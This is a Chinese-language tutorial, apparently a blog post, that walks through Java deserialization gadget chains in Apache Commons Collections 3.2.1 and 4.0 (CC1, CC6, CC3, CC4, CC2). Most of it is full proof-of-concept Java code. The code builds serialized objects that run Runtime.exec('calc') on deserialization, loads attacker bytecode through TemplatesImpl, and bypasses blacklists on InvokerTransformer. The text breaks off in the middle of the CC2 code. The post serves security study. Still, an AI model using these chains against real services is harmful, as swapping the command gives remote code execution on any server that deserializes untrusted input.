Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);

所以现在的代码如下：
package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;a&quot;, &quot;b&quot;);        // 装饰 HashMap，使其在设置值时执行 transform()        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Override.class, transformedMap);        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

但是现在代码还是执行不了，我们选断点调一下看能不能走进readObject的setValue方法里面

调的时候发现memberType&#x3D;Null，所以会直接走不到
调试代码的时候可以知道name的值是memberValues键值对中的键，memberType返回在memberTypes是否查找到key，memberTypes则是第一个变量（注解）的成员方法
也就是说第一个变量我们必须查找有成员变量的Class，同时数组的key还要改成其成员方法的名字
代码变动如下：
map.put(&quot;value&quot;, &quot;b&quot;);Object o = ctor.newInstance(Target.class, transformedMap);

再调试一次，成功走进去，继续调试下去，到setValue方法

跟进进去

继续跟进

可以发现回到了我们最初的checkValue方法，但是其中的value值我们确实不可控的，怎么办呢
还记得前面的ConstantTransformer类，该类的transform方法无论后面传入的value是什么，都将返回构造对象时构造方法传入的那个对象
所以我们只需在transformers数组中第一个位置添上该类便可以了
因此最终的完整链代码如下
package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

执行的话会成功弹计算器
CC6LazyMap类之前我们在找哪里有调用transform方法的时候除了TransformedMap外，还有一个LazyMap中的get方法调用了transform方法

我们查看get方法可以发现其中的factory完全可控，只需要传入一个Transformer类的参数就可以了

开始往回找哪里有调用get方法，这边的话比较难找，还是在sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java文件中，我们搜索一下该文件里面哪里有调用get方法，并且还是我们可控的、比较简单的，如下是位于invoke方法中的
invoke方法什么时候会调用呢，就是只要外面有调用方法，就都会调用到invoke方法

所以我们需要一个动态代理annotationInvocationHandler并调用任意的方法

AnnotationInvocationHandler序列化，然后在它里面放一个代理，然后代理里面放一个LazyMap，LazyMap里面再放一个ChainedTransformer
我们现在看下前面的代码要怎样才能执行到get方法
首先外面执行的方法不能够是圈出来的那几个方法，并且还必须是还不能够有参数，有参数会直接抛出报错

所以我们看下readObject里面有没有这种方法，很幸运有个entrySet方法（到时候会自动调用）

所以我们测试的代码如下：
package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        InvocationHandler h = (InvocationHandler) ctor.newInstance(Override.class, lazyMap);        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h);        Object o = ctor.newInstance(Override.class,mapProxy);//        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

反序列化后成功弹出计算器
在上述代码中，readObject时的memberValues的值是mapProxy，然后当到invoke方法的时候memberValues的值则是lazyMap

很遗憾的是上面两种方法在更高的jdk版本中都用不了了，那有没有一条不受jdk版本限制的链呢，答案肯定是有的，那就是CC6这条链
TiedMapEntry类我们关注TiedMapEntry类，查看该类中的hashCode方法（就是之前URLDNS那条链的）

方法中调用了getValue方法，我们继续跟进，发现它调用了get方法

并且参数map可控，我们到时候改成LazyMap就可以了，这样子就又和上面的后半条链对上了
其构造函数的参数一个是map，一个是键

我们继续分析，我们要把hashMap作为入口类，看到了它的readObject()方法调用了hash方法

继续跟进，发现hash方法里面调用了hashCode方法，hash的参数是key，所以我们要把TiedMapEntry类的对象放在hashMap的键处

所以测试代码如下：
public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        //map.put(&quot;value&quot;, &quot;222&quot;); //可加可不加        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();        map2.put(tiedMapEntry, &quot;bbb&quot;);        serialize(map2);    &#125;

确实出现了计算器弹窗，但是不需要反序列化也可以，这不禁让人想到了之前URLDNS链的那一个类似的点，因为put()方法中也会调用hash()方法

那就采取和当时类似的做法呗，既然put会调用hash那就先在这之前通过反射修改某些属性使得这条链无法走下去
这里直接选择把lazyMap的chainedTransformer改成随便一个Transform对象，put之后再通过反射将lazyMap.factory的值改为chainedTransformer
Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry, &quot;bbb&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(lazyMap, chainedTransformer);

但是这样子修改完了之后无论是序列化还是反序列化的时候都无法执行弹窗，这是为什么呢
问题出在了LazyMap的get()方法上，LazyMap，字面意思很好理解也就是懒加载，当判断map中获取不到key，也就是get不到时，就去调用factory的transform方法来向map中添加一组键值对并返回调用transform()方法后的结果。一开始在调用put()方法时避免不了调用hashCode()，也就无法避免使用getValue()-&gt;get()方法，因此键名为aaa的键在put时就会插入到lazyMap.map中，当向map中插入这个键值对之后，也就是说lazyMap的map中此时已经存在了aaa这个键了，这时候进行反序列化是无法满足这个if的判断的，因此我们只需要在调用put方法过后删除掉aaa这个键即可

完整代码如下
package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();        map2.put(tiedMapEntry, &quot;bbb&quot;);        lazyMap.remove(&quot;aaa&quot;);        Class c = LazyMap.class;        Field factoryField = c.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(lazyMap, chainedTransformer);//        serialize(map2);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

CC3newTransformer()方法这里通过CLassLoader类中的defineClass方法进行类加载，但该方法是一个受保护的方法，不能够直接调用，所以我们可以寻找一下有没有重写该方法的地方
CLassLoader类中有多个重写的defineClass方法，我们一个个查找用法看有没有public的地方，最终找到如下：

发现该方法是默认的，说明只有在该文件中可以调用该方法，所以我们查找一下是在defineTransletClasses方法中调用了，可惜是私有的
在defineTransletClasses()方法下找到了对其的调用，并且结果被_class数组给获取到了，跟踪到这里其实心里已经觉得很大概率就是走的这个利用链了，至少目前为止没错。接下来就是寻找_class数组内元素的实例化，既然有类加载方法，大概率这个类也是有类实例化的方法的

那我们继续查找该方法的用途，在getTransletInstance()方法中对_class元素的实例化，下标_transletIndex可控

但是此处的getTransletInstance()方法仍然是私有的方法，因此还得继续查找方法调用直至到public：newTransformer这个public方法

到现在我们就找到了一条很好的利用链了
新建对象的时候会调用getTransletInstance()方法，而getTransletInstance()中如果_class还是null的话就会调用defineTransletClasses()方法进行类加载后再在getTransletInstance()中进行实例化
TemplatesImpl templates = new TemplatesImpl();templates.newTransformer();

看着是很简单，但这边我们调用的是无参构造函数，还不定能够执行到defineClass方法，我们来看一看
首先就是_name参数不能够为空，而_class参数必须为空，继续跟进defineTransletClasses()方法

我们可以知道_bytecodes参数不能为空，否则会抛异常；_tfactory参数会调用一个方法，所以它也必须被赋值

目前较为明显的就这三个参数，我们直接通过反射对他们进行赋值
特别要注意的是_bytecodes参数，这是因为defineClass的参数就是它，与类加载有关，我们查看一下该参数，可以发现是二维数组

那要怎么给它赋值呢，这我们就需要看下该处重写的defineClass方法的逻辑了

可以发现它需要的是一个一维数组，所以我们就是要在_bytecodes中的成员需要时一维数组，内容是字节码
我们再看一下_tfactory参数，前面的transient代表的是不可序列化

这说明即使我们现在给它进行赋值，到反序列化后也还是会等于null，但我们有需要这个值，那说明了readObject中肯定有东西，在readObject中已经给它赋值完了

所以我们最初的测试代码如下，但是运行之后会报空指针错误，位于defineTransletClasses()方法

我们调试看一下，断点设在如下所示的位置：

调试下来发现空指针出错在_auxClasses为空

有两种解决方法，一种是走进if从句中，另一种是给_auxClasses赋值
用第二种方法的话_transletIndex值默认等于-1，运行下去的话还是会报另一种错误

所以第二种方案不可行，if从句的意思是_class的父类必须是ABSTRACT_TRANSLET，如下

所以我们需要让Test类继承该抽象类，并实现抽象方法
package org.example;import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;	    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;

现在我们再返回去执行测试代码，成功弹出计算器
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Cc3 &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        templates.newTransformer();    &#125;&#125;

上述代码说明了只要我们执行了newTransformer()方法，就相当于可以执行任意代码了
那么我们只要把这个扔进ChainedTransformer中就可以了，然后我们直接把cc1的后半段直接粘过来就可以了
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());//        templates.newTransformer();        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(templates),                new InvokerTransformer(&quot;newTransformer&quot;, null, null)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(1); 测试chainedTransformer可不可以运行        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);//        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

于是乎我们又有了一条新的链

InstantiateTransformer类但是要是黑名单把InvokerTransform类给禁掉了的话，我们还能有什么办法可以绕过
我们查看一下newTransformer()方法有哪些地方会调用到，下面有一个我们可以利用

TrAXFilter类不能被序列化，但是我们想序列化它的话只能从它的Class入手，就跟Runtime一样，这样子的话我们要怎么赋值呢，那就是在构造函数里面，而我们所需要的方法也出现在构造函数中
这次我们不用InvokerTransform类，改用InstantiateTransformer类，我们看一下它的transform方法

简单来说就是看输入是不是一个类，如果是的话就会调用它的构造器来进行初始化
InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);instantiateTransformer.transform(TrAXFilter.class); //它的class类型可以序列化，该行代码运行可以弹出计算器

接下来用上cc1的前半条链，附上完整代码
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        instantiateTransformer.transform(TrAXFilter.class); //它的class类型可以序列化，该行代码运行可以弹出计算器        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);//        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

这样子我们就又有一条新链

CC4依赖引入
&lt;dependency&gt;    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;    &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;

下面的方法等全部都是用collections4中的，不再是3.2.1中的

CC4.0仍可利用3的CommonsCollections4.0中仍然存在3.2.1的反序列化链，把LazyMap.decorate()改成LazyMap.lazyMap()就行了
package com.potato.Commons_Collections;import com.potato.Tools.Utils;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.HashMap;public class CC4 &#123;    public static void main(String[] args) throws Exception&#123;//        Class.class.getMethod().invoke();        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;);//        chainedTransformer.transform(11);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();//        hashMap.put(&quot;11&quot;,&quot;111&quot;);        Class&lt;?&gt; c = org.apache.commons.collections4.map.LazyMap.class;        LazyMap lazyMap = org.apache.commons.collections4.map.LazyMap.lazyMap(hashMap,new ConstantTransformer(11));//        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(11));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1);//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1);        HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();        hashMap1.put(tiedMapEntry,&quot;1&quot;);        Field factoryField = c.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(lazyMap,chainedTransformer);        lazyMap.remove(1);//        Class&lt;?&gt;        Utils.serialize(hashMap1);        Utils.unserialize(&quot;obj.ser&quot;);    &#125;&#125;

利用优先队列我们查看ChainedTransformer类中transform方法的用法，找一个新的，位于org&#x2F;apache&#x2F;commons&#x2F;collections4&#x2F;comparators&#x2F;TransformingComparator.java中的compare()方法
选这个的理由在于该类也是可以被序列化的

我们继续查找compare方法的用途，也是要在readObject中调用了该方法，比较难找，即在优先队列（PriorityQueue）中
在该类的readObject中调用了一个heapify方法

我们跟进去，对该函数调用的方法继续跟踪，直到下面这个函数为止

调用了compare方法，也就会调用上transform方法
这样子的话我们就有了一条新的链
完整代码如下：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cc4 &#123;    public static void main(String[] args) throws Exception&#123;        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;);//        chainedTransformer.transform(11);        //避免在序列化的时候就谈计算器        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);                //队列中需要有两个值才可以执行到readObject中heapify()方法中的for循环区域内        priorityQueue.add(1);        priorityQueue.add(2);        Class c = transformingComparator.getClass();        Field transformerField = c.getDeclaredField(&quot;transformer&quot;);        transformerField.setAccessible(true);        transformerField.set(transformingComparator, chainedTransformer);//        serialize(priorityQueue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

其中chainedTransformer中的内容也可以换成CC3中的InstantiateTransformer类，绕过InvokerTransformer类被禁的情况
CC2其实就是CC4和newTransformer()方法的拼接
TransformingComparator类在cc4中实现了序列化接口
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cc2 &#123;    public static void main(String[] args) throws  Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        